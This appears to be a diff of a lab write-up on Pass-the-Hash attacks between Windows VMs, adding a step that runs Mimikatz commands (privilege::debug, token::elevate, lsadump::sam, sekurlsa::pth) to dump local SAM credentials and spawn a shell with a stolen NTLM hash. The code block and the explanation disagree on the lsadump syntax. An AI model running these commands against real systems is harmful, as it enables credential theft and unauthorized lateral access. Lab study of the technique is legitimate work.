@@ -38,7 +38,18 @@ Pass-the-Hash is a potent technique attackers use to access remote servers or se
 3. If PsExec cannot be launched and used between different version of Windows, just clone the Windows 7 VM used to standardise all the settings
 4. To test PsExec, navigate to its folder and launch it in the command prompt with administrator privileges. Since the Windows 7 VM used in this task is 64-bit, use `psexec64 \\<IP_address_of_target_2> ipconfig` and see if it works. The screenshot below shows a working PsExec:
    ![image](https://github.com/user-attachments/assets/3b16df83-f00f-45ff-bda9-802d32967918)
-5. 
+5. Open PowerShell with administrator privileges and navigate to the folder where Mimikatz is stored, then run Mimikatz. Use each of the commands below in order
+   ```
+   privilege::debug
+   token::elevate
+   lsadump:sam
+   sekurlsa::pth /user:<username> /domain:<domain_name> /ntlm:<NTLM_hash> /run:cmd.exe
+   ```
+   - `privilege::debug` is used for getting debug rights (this or Local System rights is required for many Mimikatz commands). By default, the Administrators group has Debug rights. Debug still has to be “activated” by running “privilege::debug”
+   - `token::elevate` is used for impersonating a token. Used to elevate permissions to SYSTEM (default) or find a domain admin token on the box using the Windows API
+   - `lsadump::sam` is used for getting the SysKey to decrypt SAM entries (from registry or hive). The SAM option connects to the local Security Account Manager (SAM) database and dumps credentials for local accounts. It requires System or Debug rights. Note that the domain name nad the NTLM hash will appear here
+   - `sekurlsa::pth /user:<username> /domain:<domain_name> /ntlm:<NTLM_hash> /run:cmd.exe` is used to pass the hash. This will spawn a command prompt
+6. 
 
 
 
